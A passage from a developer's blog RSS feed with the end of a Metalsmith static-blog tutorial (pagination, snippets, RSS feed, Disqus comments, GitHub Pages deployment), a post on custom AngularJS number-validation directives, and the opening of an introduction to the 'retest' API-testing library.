      first: &lt;span class=&quot;hljs-string&quot;&gt;'index.html'&lt;/span&gt;,
      path: &lt;span class=&quot;hljs-string&quot;&gt;'page/:num/index.html'&lt;/span&gt;,
      template: &lt;span class=&quot;hljs-string&quot;&gt;'index.jade'&lt;/span&gt;
    }
  }))&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can set a limit of files per page, the path to all pages, an alternative first page location, and the template for rendering the files. With this defined, you&amp;#39;ll need to make some tweaks and improvements to the &lt;code&gt;index.jade&lt;/code&gt; template.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-jade.diff&quot;&gt;&lt;span class=&quot;diff-null&quot;&gt;html(lang='en')
  head
    meta(charset='utf-8')
    meta(http-equiv='X-UA-Compatible', content='IE=edge,chrome=1')
    meta(name='viewport', content='width=device-width')
    title= 'Home'
  body&lt;/span&gt;
&lt;span class=&quot;diff-deletion&quot;&gt;    each article in collections.articles&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;    each article in pagination.files&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;      article.content-article
        header
          span.timestamp= moment(article.date).format('MMMM D, YYYY')
          h2
            a(href='/' + article.path)= article.title&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  nav
    if pagination.previous
      a.btn(href='/' + pagination.previous.path)
        | Newer
    if pagination.next
      a.btn(href='/' + pagination.next.path)
        | Older&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Notice that the loop has changed to iterate over &lt;code&gt;pagination.files&lt;/code&gt; instead. Also &amp;quot;next&amp;quot; and &amp;quot;previous&amp;quot; buttons have been added to the homepage. For the plugin to work properly, it needs to be included after the collections plugin, but before the permalinks and templates plugins. This works because we need access to the collections metadata in the plugin, but need the generated files to have a path and content created using templates.&lt;/p&gt;
&lt;h2 id=&quot;article-snippets&quot;&gt;Article Snippets&lt;/h2&gt;
&lt;p&gt;Another thing that all good blogs seem to have are content snippets. For this, you&amp;#39;ll install &lt;a href=&quot;https://github.com/blakeembrey/metalsmith-snippet&quot;&gt;metalsmith-snippet&lt;/a&gt; which allows you to access a short snippet of the HTML files in templates. Let&amp;#39;s include the plugin in the &lt;code&gt;build.js&lt;/code&gt; file.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript.diff&quot;&gt;&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; paginate    = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-collections-paginate'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; snippet     = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'metalsmith-snippet'&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  .use(snippet())&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;  .use(permalinks())
  .use(templates({
    engine: &lt;span class=&quot;hljs-string&quot;&gt;'jade'&lt;/span&gt;,
    directory: &lt;span class=&quot;hljs-string&quot;&gt;'templates'&lt;/span&gt;
  }))&lt;/span&gt;
&lt;span class=&quot;diff-chunk&quot;&gt;@@ ... @@&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will automatically generate a snippet for all the articles based on a number of characters. Make sure it comes after the markdown parsing is done though. With this enabled, we can add &lt;code&gt;article.snippet&lt;/code&gt; to the homepage template and print out article summaries.&lt;/p&gt;
&lt;h2 id=&quot;enable-xml-feed&quot;&gt;Enable XML Feed&lt;/h2&gt;
&lt;p&gt;Next up, we will enable an XML feed for the blog. This will allow people to subscribe to the blog for new articles in feed readers. To do this, you&amp;#39;ll need to create a template for our feed. Here&amp;#39;s my &lt;code&gt;feed.jade&lt;/code&gt; template:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-jade&quot;&gt;doctype xml
rss(version=&amp;#39;2.0&amp;#39;,
    xmlns:content=&amp;#39;http://purl.org/rss/1.0/modules/content/&amp;#39;,
    xmlns:wfw=&amp;#39;http://wellformedweb.org/CommentAPI/&amp;#39;,
    xmlns:dc=&amp;#39;http://purl.org/dc/elements/1.1/&amp;#39;
    xmlns:atom=&amp;#39;http://www.w3.org/2005/Atom&amp;#39;)
  channel
    title= blog.title
    atom:link(href=blog.url + &amp;#39;/feed.xml&amp;#39;, rel=&amp;#39;self&amp;#39;, type=&amp;#39;application/rss+xml&amp;#39;)
    link= blog.url
    description= blog.description
    pubDate= moment(date).format(&amp;#39;ddd, DD MMM YYYY HH:mm:ss ZZ&amp;#39;)
    language en
    for article in collections.articles
      - var permalink = blog.url + &amp;#39;/&amp;#39; + article.path
      item
        title= article.title
        link= permalink
        pubDate= moment(article.date).format(&amp;#39;ddd, DD MMM YYYY HH:mm:ss ZZ&amp;#39;)
        guid(isPermaLink=&amp;#39;true&amp;#39;)= permalink
        author= article.author
        description= article.snippet
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The snippet above is creating a new XML document. We add a bunch of metadata properties to the XML feed for describing various things, then iterate over all the articles and output each article as an XML &lt;code&gt;item&lt;/code&gt;. The one new thing you might notice is the global &lt;code&gt;date&lt;/code&gt; variable, which is added by &lt;a href=&quot;https://github.com/segmentio/metalsmith-build-date&quot;&gt;metalsmith-build-date&lt;/a&gt; (&lt;code&gt;npm install metalsmith-build-date&lt;/code&gt; and &lt;code&gt;.use(date())&lt;/code&gt;). For this template to render, we will create a &lt;code&gt;feed.xml&lt;/code&gt; in the &lt;code&gt;src&lt;/code&gt; directory with the content below.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
template: feed.jade
---
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;adding-comments&quot;&gt;Adding Comments&lt;/h2&gt;
&lt;p&gt;One important aspect of a blog is having a place for readers to leave their comments and thoughts, with the goal of continuing the discussion beyond the original article. For a static site, our comment systems are little more limited to JavaScript implementations that provide their own backend for storage. Personally, I tend to gravitate toward &lt;a href=&quot;http://disqus.com/&quot;&gt;disqus&lt;/a&gt;. Let&amp;#39;s add their snippet to the bottom of &lt;code&gt;article.jade&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-jade&quot;&gt;div#disqus_thread

script.
  //- Disqus code snippet
  (function() {
    var dsq = document.createElement(&amp;#39;script&amp;#39;); dsq.type = &amp;#39;text/javascript&amp;#39;; dsq.async = true;
    dsq.src = &amp;#39;//blakeembrey.disqus.com/embed.js&amp;#39;;
    (document.getElementsByTagName(&amp;#39;head&amp;#39;)[0] || document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]).appendChild(dsq);
  })();
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;deploying-to-github-pages&quot;&gt;Deploying to Github Pages&lt;/h2&gt;
&lt;p&gt;Now that we&amp;#39;ve got our static site running, we need to find a way to distribute it to the masses. We can host it anywhere statically without any hassle, but I opted to use &lt;a href=&quot;https://pages.github.com/&quot;&gt;Github Pages&lt;/a&gt;. For this to work I added a &lt;code&gt;CNAME&lt;/code&gt; file to the &lt;code&gt;src&lt;/code&gt; directory - this is needed for Github to allow a custom domain.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;blakeembrey.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, I created a simple deploy script and added it to my &lt;code&gt;package.json&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-json.diff&quot;&gt;&lt;span class=&quot;diff-null&quot;&gt;{
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;name&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;example-blog&quot;&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;version&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;0.0.0&quot;&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;private&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;description&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;Example blog.&quot;&lt;/span&gt;&lt;/span&gt;,&lt;/span&gt;
&lt;span class=&quot;diff-addition&quot;&gt;  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;scripts&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;{
    &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;build&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;node build.js&quot;&lt;/span&gt;&lt;/span&gt;,
    &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;deploy&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;npm run build &amp;amp;&amp;amp; cd build &amp;amp;&amp;amp; git init . &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git commit -m \&quot;Deploy\&quot;; git push \&quot;git@github.com:blakeembrey/blakeembrey.com.git\&quot; master:gh-pages --force &amp;amp;&amp;amp; rm -rf .git&quot;&lt;/span&gt;
  &lt;/span&gt;}&lt;/span&gt;,&lt;/span&gt;
&lt;span class=&quot;diff-null&quot;&gt;  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;author&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;Blake Embrey&quot;&lt;/span&gt;&lt;/span&gt;,
  &quot;&lt;span class=&quot;hljs-attribute&quot;&gt;license&lt;/span&gt;&quot;: &lt;span class=&quot;hljs-value&quot;&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;MIT&quot;&lt;/span&gt;
&lt;/span&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For the build script above to work for you, you&amp;#39;ll need to change the repository (&lt;code&gt;blakeembrey/blakeembrey.com&lt;/code&gt;) to your Github repository.&lt;/p&gt;
&lt;h2 id=&quot;extra-goodies&quot;&gt;Extra Goodies&lt;/h2&gt;
&lt;p&gt;I also implemented a couple of bonus things in this blog during development - &lt;a href=&quot;https://github.com/esundahl/metalsmith-autoprefixer&quot;&gt;metalsmith-autoprefixer&lt;/a&gt; for adding browser prefixes to my CSS and &lt;a href=&quot;https://github.com/aymericbeaumet/metalsmith-redirect&quot;&gt;metalsmith-redirect&lt;/a&gt; for maintaining backwards compatibility with my old URLs. Check out the &lt;a href=&quot;http://www.metalsmith.io/&quot;&gt;Metalsmith homepage&lt;/a&gt; to discover more great plugins.&lt;/p&gt;
&lt;h2 id=&quot;live-&quot;&gt;Live!&lt;/h2&gt;
&lt;p&gt;And we&amp;#39;re done, let&amp;#39;s get this blog live. All we need to do now is execute &lt;code&gt;npm run deploy&lt;/code&gt;, which will run the build and deploy scripts and push to Github. All code and content for this blog and article is &lt;a href=&quot;https://github.com/blakeembrey/blakeembrey.com&quot;&gt;open source&lt;/a&gt;, so feel free to browse for more ideas.&lt;/p&gt;
</description></item><item><title>Avoid type=&quot;number&quot; in AngularJS</title><link>http://blakeembrey.com/articles/2014/05/angular-js-number-validation-bug</link><pubDate>Fri, 09 May 2014 20:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/05/angular-js-number-validation-bug</guid><author>Blake Embrey</author><description>&lt;p&gt;The other day I got hit by a peculiar bug in Angular. Using &lt;code&gt;type=&amp;quot;number&amp;quot;&lt;/code&gt; on an input element wouldn&amp;#39;t do any number validation. On top of this, when I entered an invalid number the only validation failing was &lt;code&gt;required&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After a little research, it turned out to be a &lt;a href=&quot;http://www.w3.org/TR/html5/forms.html#number-state-%28type=number%29&quot;&gt;&amp;quot;feature&amp;quot;&lt;/a&gt; of blocking access to the &lt;code&gt;value&lt;/code&gt; attribute when it&amp;#39;s an invalid number. Not all browsers follow the complete spec, so I found this was working in Firefox. Back in Chrome however, it was failing. You can even test this in the &lt;a href=&quot;https://docs.angularjs.org/api/ng/input/input%5Bnumber%5D&quot;&gt;AngularJS documentation&lt;/a&gt; by typing an invalid number in the demo and looking at the error message.&lt;/p&gt;
&lt;h2 id=&quot;custom-type-directive&quot;&gt;Custom Type Directive&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; app = angular.module(&lt;span class=&quot;hljs-string&quot;&gt;'myApp'&lt;/span&gt;, []);

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Provide custom type validation for input elements. Certain type attributes
 * don't work consistenty cross-browser, so this is a required workaround.
 * Looking at you, webkit and `type=&quot;number&quot;`.
 *
 * ```html
 * &amp;lt;input
 *   ng-model=&quot;&quot;
 *   app-type=&quot;&quot;&amp;gt;
 * ```
 */&lt;/span&gt;
app.directive(&lt;span class=&quot;hljs-string&quot;&gt;'appType'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; {
    &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;'ngModel'&lt;/span&gt;,
    link: &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;scope, elem, attrs, ctrl&lt;/span&gt;) &lt;/span&gt;{
      &lt;span class=&quot;hljs-comment&quot;&gt;// Custom number validation logic.&lt;/span&gt;
      &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (attrs.appType === &lt;span class=&quot;hljs-string&quot;&gt;'number'&lt;/span&gt;) {
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; ctrl.$parsers.push(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;value&lt;/span&gt;) &lt;/span&gt;{
          &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; valid = value == &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt; || &lt;span class=&quot;hljs-built_in&quot;&gt;isFinite&lt;/span&gt;(value);

          ctrl.$setValidity(&lt;span class=&quot;hljs-string&quot;&gt;'number'&lt;/span&gt;, valid);

          &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; valid &amp;amp;&amp;amp; value != &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt; ? &lt;span class=&quot;hljs-built_in&quot;&gt;Number&lt;/span&gt;(value) : &lt;span class=&quot;hljs-literal&quot;&gt;undefined&lt;/span&gt;;
        });
      }
    }
  };
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The code above adds a new custom directive that requires &lt;code&gt;ngModel&lt;/code&gt;. Requiring &lt;code&gt;ngModel&lt;/code&gt; provides us with the &lt;a href=&quot;http://docs.angularjs.org/api/ng.directive:ngModel.NgModelController&quot;&gt;ngModelController&lt;/a&gt;. Using the controller we can access some useful methods, including model input parsing and validity - which makes up the bulk of our validation logic.&lt;/p&gt;
&lt;p&gt;When the type is &lt;code&gt;number&lt;/code&gt;, we push a custom parser onto the stack. Our parser goes on the end and will run after any other parsers, allowing us to keep the &lt;code&gt;required&lt;/code&gt; directive in tact. The validity itself checks if the value is empty (&lt;code&gt;null&lt;/code&gt; or &lt;code&gt;undefined&lt;/code&gt;) or that it&amp;#39;s a valid JavaScript number. Valid &amp;quot;JavaScript number&amp;quot; is important to note, since this will allow the most comprehensive check including integers, floats, negative and positive notation, but also other notations such as &lt;code&gt;0x1e5&lt;/code&gt; and &lt;code&gt;1e5&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Validity gets set next and based on the result we&amp;#39;ll coerce the value into a number. By doing number coercion, the model will correctly receive the number instead of the string representation. We want to avoid coercing empty values (&lt;code&gt;null&lt;/code&gt; and &lt;code&gt;undefined&lt;/code&gt;) however, which will come out as &lt;code&gt;0&lt;/code&gt; and &lt;code&gt;NaN&lt;/code&gt; respectfully.&lt;/p&gt;
&lt;h2 id=&quot;recreating-min-and-max-directives&quot;&gt;Recreating min and max directives&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; app = angular.module(&lt;span class=&quot;hljs-string&quot;&gt;'myApp'&lt;/span&gt;, []);

&lt;span class=&quot;hljs-comment&quot;&gt;/**
 * Provide minimum number validation for any input.
 *
 * ```html
 * &amp;lt;input
 *   ng-model=&quot;&quot;
 *   app-min=&quot;&quot;&amp;gt;
 * ```
 */&lt;/span&gt;
app.directive(&lt;span class=&quot;hljs-string&quot;&gt;'appMin'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; {
    &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;'ngModel'&lt;/span&gt;,
    link: &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;scope, elem, attrs, ctrl&lt;/span&gt;) &lt;/span&gt;{
      &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; ctrl.$parsers.push(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;value&lt;/span&gt;) &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; valid = value == &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt; || &lt;span class=&quot;hljs-built_in&quot;&gt;Number&lt;/span&gt;(value) &amp;gt;= &lt;span class=&quot;hljs-built_in&quot;&gt;Number&lt;/span&gt;(attrs.appMin);

        ctrl.$setValidity(&lt;span class=&quot;hljs-string&quot;&gt;'min'&lt;/span&gt;, valid);

        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; valid ? value : &lt;span class=&quot;hljs-literal&quot;&gt;undefined&lt;/span&gt;;
      });
    }
  };
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Recreating the &lt;code&gt;min&lt;/code&gt; directive is trivial and we can easily make it work for any input. The above validation does the &lt;code&gt;null&lt;/code&gt; check again, which will make an empty input element valid. This is important since we don&amp;#39;t want to provide unnecessary validation and bundle the &lt;code&gt;required&lt;/code&gt; directives job into ours.&lt;/p&gt;
&lt;p&gt;Next it&amp;#39;s just a process of coercing both the value and attribute into numbers and comparing the values. If either are &lt;code&gt;NaN&lt;/code&gt;, validation will fail. This provides some form of ensuring we have numbers only, but won&amp;#39;t do any number coerce to the model. Finally, we return either the value or &lt;code&gt;undefined&lt;/code&gt; if validation failed.&lt;/p&gt;
&lt;h2 id=&quot;unit-testing&quot;&gt;Unit Testing&lt;/h2&gt;
&lt;p&gt;Unit testing the functionality was straightforward enough, so I won&amp;#39;t provide all the code used. A couple of things worth mentioning though is how to compile the templates for testing and set the values for validation.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;it(&lt;span class=&quot;hljs-string&quot;&gt;'...'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
  inject(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;$compile, $rootScope&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; $scope = $rootScope.$&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt;();

    $scope.model = {};

    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; $element = $compile(
      &lt;span class=&quot;hljs-string&quot;&gt;'&amp;lt;form name=&quot;form&quot;&amp;gt;'&lt;/span&gt; +
      &lt;span class=&quot;hljs-string&quot;&gt;'  &amp;lt;input name=&quot;num&quot; ng-model=&quot;model.value&quot; app-type=&quot;number&quot;&amp;gt;'&lt;/span&gt; +
      &lt;span class=&quot;hljs-string&quot;&gt;'&amp;lt;/form&amp;gt;'&lt;/span&gt;
    )($scope);

    &lt;span class=&quot;hljs-comment&quot;&gt;// Set the value to what you want to test.&lt;/span&gt;
    $scope.form.num.$setViewValue(&lt;span class=&quot;hljs-string&quot;&gt;'10'&lt;/span&gt;);

    &lt;span class=&quot;hljs-comment&quot;&gt;// Check the model is what you expect and check validation.&lt;/span&gt;
    $scope.model.value.should.equal(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;);
    $scope.form.num.$invalid.should.be.false;
  });
});
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>Introducing Retest</title><link>http://blakeembrey.com/articles/2014/02/introducing-node-retest</link><pubDate>Tue, 11 Feb 2014 23:30:00 +1100</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2014/02/introducing-node-retest</guid><author>Blake Embrey</author><description>&lt;p&gt;If you&amp;#39;ve looked into testing your API in node before, you&amp;#39;ve probably run across &lt;a href=&quot;https://github.com/visionmedia/supertest&quot;&gt;supertest&lt;/a&gt; by the prolific TJ Holowaychuk. So have I and it&amp;#39;s truly a fantastic library for testing APIs. However, I found it to be lacking a couple of features I sorely needed. And to my surprise, I struggled to find another request testing module in the node ecosystem.&lt;/p&gt;
&lt;p&gt;The reason I wrote &lt;a href=&quot;https://github.com/blakeembrey/retest&quot;&gt;retest&lt;/a&gt; is actually fairly simple. I needed to do away with the verbose chaining syntax and I had no need for the assertions built into supertest. Although I also could have written a HTTP request layer for retest, I decided to go with &lt;a href=&quot;https://github.com/mikeal/request&quot;&gt;request&lt;/a&gt;. It&amp;#39;s an extremely useful and well tested library for making requests, with numerous features already built-in that make it perfect for tests.&lt;/p&gt;
&lt;h2 id=&quot;how-do-i-use-it-&quot;&gt;How Do I Use It?&lt;/h2&gt;
&lt;p&gt;I based the implementation on combining the usefulness of supertest with the conciseness of request, so it&amp;#39;s extremely straightforward to get started. First we create a test request instance by wrapping an express application.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; retest  = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'retest'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; express = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'express'&lt;/span&gt;);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; app     = express();

&lt;span class=&quot;hljs-comment&quot;&gt;// Creates a request instance for interacting with our application. If the&lt;/span&gt;
&lt;span class=&quot;hljs-comment&quot;&gt;// application is not already listening on a port number, it will be bound to&lt;/span&gt;
&lt;span class=&quot;hljs-comment&quot;&gt;// an ephemeral port.&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; request = retest(app);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;request&lt;/code&gt; variable is now a wrapped instance of request, made to make requests relative to your app. You can even pass other objects to create your &lt;code&gt;request&lt;/code&gt; instance.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;// Create a request instance for a remote server.&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; request = retest(&lt;span class=&quot;hljs-string&quot;&gt;'http://google.com'&lt;/span&gt;);

&lt;span class=&quot;hljs-comment&quot;&gt;// Listen to a normal http(s) server.&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; server  = https.createServer({ ... }, app);
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; request = retest(server);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that we have our request instance, we can make requests using the options supported by &lt;a href=&quot;https://github.com/mikeal/request#requestoptions-callback&quot;&gt;request&lt;/a&gt;. That&amp;#39;s a load of functionality built-in, so I&amp;#39;ll give you a chance to peruse it later. For a basic demo, we&amp;#39;ll make a request to the root of our server.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;request(&lt;span class=&quot;hljs-string&quot;&gt;'/'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;err, res&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-comment&quot;&gt;// We have access to the response body here. Or an error if something broke.&lt;/span&gt;
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;That was simple. We just made the first request to our API. Now we can look at turning this into a test. I&amp;#39;m using Mocha and Chai, but it should make sense if you&amp;#39;ve never used them.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;it(&lt;span class=&quot;hljs-string&quot;&gt;'should respond with &quot;success&quot;'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;done&lt;/span&gt;) &lt;/span&gt;{
  request(&lt;span class=&quot;hljs-string&quot;&gt;'/'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;err, res&lt;/span&gt;) &lt;/span&gt;{
    expect(res.statusCode).to.equal(&lt;span class=&quot;hljs-number&quot;&gt;200&lt;/span&gt;);
    expect(res.body).to.equal(&lt;span class=&quot;hljs-string&quot;&gt;'success'&lt;/span&gt;);
    done(err);
  });
});
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;what-else-does-retest-do-&quot;&gt;What Else Does Retest Do?&lt;/h2&gt;
&lt;p&gt;Retest is a fairly thin wrapper around request, since so much functionality already exists in the core module. You can already pipe data to and from your requests, authenticate using OAuth or send custom query strings, bodies and headers. However, one useful feature of retest is automatic request and response body parsing.&lt;/p&gt;
&lt;p&gt;If your request specifies a JSON or URL-encoded content type and has a body, it will be automatically serialized.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;app.post(&lt;span class=&quot;hljs-string&quot;&gt;'/'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;req, res&lt;/span&gt;) &lt;/span&gt;{
  res.send(req.body);
});

retest(app).post(&lt;span class=&quot;hljs-string&quot;&gt;'/'&lt;/span&gt;, {
  headers: {
    &lt;span class=&quot;hljs-string&quot;&gt;'Content-Type'&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;'application/json'&lt;/span&gt;
  },
  body: {
    test: &lt;span class=&quot;hljs-string&quot;&gt;'data'&lt;/span&gt;
  }
}, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;err, res&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-comment&quot;&gt;// The response would be the JSON-encoded data. If the request `Content-Type`&lt;/span&gt;
  &lt;span class=&quot;hljs-comment&quot;&gt;// was set to `application/x-www-form-urlencoded`, we would expect the&lt;/span&gt;
  &lt;span class=&quot;hljs-comment&quot;&gt;// response body to equal `test=data`.&lt;/span&gt;
